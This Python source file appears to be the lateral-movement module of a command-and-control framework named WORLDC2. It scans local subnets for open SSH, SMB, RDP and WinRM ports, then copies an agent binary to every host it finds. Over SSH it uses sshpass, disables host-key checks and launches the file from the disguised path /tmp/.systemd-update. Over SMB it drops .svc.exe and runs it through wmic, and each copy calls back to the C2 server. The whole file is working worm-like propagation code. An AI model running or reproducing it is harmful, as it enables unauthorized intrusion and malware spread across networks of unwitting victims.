#!/usr/bin/env python3
"""
WORLDC2 C2 — Lateral Movement Module
Scans local network and attempts to propagate to other hosts.

Commands:
    lateral scan          — Scan local network for live hosts
    lateral scan --ports  — Scan specific ports
    lateral spread ssh    — Spread via SSH
    lateral spread smb    — Spread via SMB
    lateral spread all    — Try all methods

Usage from C2 console:
    [agent] > lateral scan
    [agent] > lateral spread ssh --user admin --password Pass123
"""

import os
import sys
import socket
import subprocess
import threading
import ipaddress
from pathlib import Path

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

def get_local_networks():
    """Get local network ranges."""
    networks = []
    try:
        # Linux
        with open('/proc/net/fib_trie') as f:
            content = f.read()
            for line in content.split('\n'):
                if '--' in line and '127.' not in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        ip = parts[-1].replace('--', '').strip()
                        if ip and not ip.startswith('127.'):
                            try:
                                net = ipaddress.IPv4Network(f"{ip}/24", strict=False)
                                networks.append(net)
                            except:
                                pass
    except:
        pass
    
    if not networks:
        # Fallback: common private ranges
        networks = [
            ipaddress.IPv4Network("192.168.1.0/24"),
            ipaddress.IPv4Network("192.168.0.0/24"),
            ipaddress.IPv4Network("10.0.0.0/24"),
            ipaddress.IPv4Network("172.16.0.0/24"),
        ]
    
    return networks

def scan_host(ip, ports, timeout=1):
    """Scan a single host for open ports."""
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((str(ip), port))
            if result == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    return str(ip), open_ports

def lateral_scan(ports=None, threads=50, timeout=1):
    """Scan local network for live hosts."""
    if ports is None:
        ports = [22, 80, 443, 445, 3389, 5985, 8080]
    
    networks = get_local_networks()
    print(f"{BOLD}Scanning {len(networks)} network(s)...{RESET}")
    
    all_hosts = []
    for net in networks:
        hosts = list(net.hosts())
        all_hosts.extend(hosts)
    
    print(f"{BOLD}Total hosts to scan: {len(all_hosts)}{RESET}")
    print(f"{BOLD}Ports: {ports}{RESET}\n")
    
    results = {}
    threads_list = []
    
    def scan_worker(host):
        ip, open_ports = scan_host(host, ports, timeout)
        if open_ports:
            results[ip] = open_ports
    
    for host in all_hosts:
        t = threading.Thread(target=scan_worker, args=(host,))
        threads_list.append(t)
        t.start()
        
        if len([th for th in threads_list if th.is_alive()]) >= threads:
            import time
            time.sleep(0.1)
    
    for t in threads_list:
        t.join()
    
    # Print results
    print(f"\n{BOLD}{'='*50}{RESET}")
    print(f"{BOLD}Scan Results:{RESET}\n")
    
    for ip, ports in sorted(results.items()):
        port_str = ', '.join(str(p) for p in ports)
        services = {22: 'SSH', 80: 'HTTP', 443: 'HTTPS', 445: 'SMB', 3389: 'RDP', 5985: 'WinRM', 8080: 'HTTP-Alt'}
        svc_str = ', '.join(services.get(p, str(p)) for p in ports)
        print(f"  {GREEN}[✓]{RESET} {ip:16s} Ports: {port_str} ({svc_str})")
    
    print(f"\n{BOLD}Found {len(results)} live hosts{RESET}")
    print(f"{BOLD}{'='*50}{RESET}")
    
    return results

def lateral_spread_ssh(targets, user, password, server_addr, port=22):
    """Spread to targets via SSH."""
    agent_bin = find_agent_binary()
    if not agent_bin:
        return {"error": "No agent binary available"}
    
    results = {}
    for target in targets:
        try:
            remote_path = "/tmp/.systemd-update"
            
            # Upload
            scp = f"sshpass -p '{password}' scp -o StrictHostKeyChecking=no -P {port} {agent_bin} {user}@{target}:{remote_path}"
            r = subprocess.run(scp, shell=True, capture_output=True, text=True, timeout=15)
            
            if r.returncode == 0:
                # Execute
                ssh = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -P {port} {user}@{target} 'chmod +x {remote_path} && nohup {remote_path} --server {server_addr} &>/dev/null &'"
                r2 = subprocess.run(ssh, shell=True, capture_output=True, text=True, timeout=15)
                
                if r2.returncode == 0:
                    results[target] = ("OK", "Deployed via SSH")
                else:
                    results[target] = ("PARTIAL", "Uploaded but exec failed")
            else:
                results[target] = ("FAIL", "SCP failed")
        except Exception as e:
            results[target] = ("FAIL", str(e))
    
    return results

def lateral_spread_smb(targets, user, password, server_addr):
    """Spread to targets via SMB."""
    agent_bin = find_agent_binary()
    if not agent_bin:
        return {"error": "No agent binary available"}
    
    results = {}
    for target in targets:
        try:
            # Try to copy to ADMIN$ or C$
            share = "C$"
            cmd = f'smbclient //{target}/{share.replace("$", "")} -U {user}%{password} -c "put {agent_bin} Windows/Temp/.svc.exe"'
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            
            if r.returncode == 0:
                # Execute via wmic
                wmic = f'wmic /node:{target} /user:{user} /password:{password} process call create "C:\\Windows\\Temp\\.svc.exe --server {server_addr}"'
                r2 = subprocess.run(wmic, shell=True, capture_output=True, text=True, timeout=15)
                
                if r2.returncode == 0:
                    results[target] = ("OK", "Deployed via SMB+WMIC")
                else:
                    results[target] = ("PARTIAL", "Uploaded but exec failed")
            else:
                results[target] = ("FAIL", "SMB copy failed")
        except Exception as e:
            results[target] = ("FAIL", str(e))
    
    return results

def find_agent_binary():
    """Find the agent binary."""
    project_root = Path(__file__).parent.parent
    candidates = [
        project_root / "worldc2-agent",
        project_root / "worldc2-agent.exe",
        project_root / "dist" / "worldc2-agent-linux",
    ]
    for c in candidates:
        if c.exists():
            return str(c)
    return None

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="WORLDC2 Lateral Movement")
    sub = parser.add_subparsers(dest='command')
    
    # Scan
    scan_p = sub.add_parser('scan', help='Scan local network')
    scan_p.add_argument('--ports', type=int, nargs='+', default=[22, 80, 443, 445, 3389, 5985])
    scan_p.add_argument('--threads', type=int, default=50)
    
    # Spread
    spread_p = sub.add_parser('spread', help='Spread to targets')
    spread_p.add_argument('method', choices=['ssh', 'smb', 'all'])
    spread_p.add_argument('--targets', nargs='+', help='Target IPs')
    spread_p.add_argument('--user', default='admin')
    spread_p.add_argument('--password', default='')
    spread_p.add_argument('--server', default=None)
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'scan':
        lateral_scan(ports=args.ports, threads=args.threads)
    
    elif args.command == 'spread':
        if not args.server:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            args.server = s.getsockname()[0] + ":8443"
            s.close()
        
        if not args.targets:
            # Auto-scan first
            print(f"{YELLOW}No targets specified — scanning local network...{RESET}")
            scan_results = lateral_scan()
            args.targets = list(scan_results.keys())
        
        print(f"\n{BOLD}Spreading to {len(args.targets)} targets via {args.method}...{RESET}\n")
        
        if args.method in ('ssh', 'all'):
            results = lateral_spread_ssh(args.targets, args.user, args.password, args.server)
            print_results(results)
        
        if args.method in ('smb', 'all'):
            results = lateral_spread_smb(args.targets, args.user, args.password, args.server)
            print_results(results)

def print_results(results):
    for target, (status, msg) in results.items():
        if status == "OK":
            print(f"  {GREEN}[✓]{RESET} {target:16s} {msg}")
        elif status == "PARTIAL":
            print(f"  {YELLOW}[!]{RESET} {target:16s} {msg}")
        else:
            print(f"  {RED}[✗]{RESET} {target:16s} {msg}")

if __name__ == "__main__":
    main()
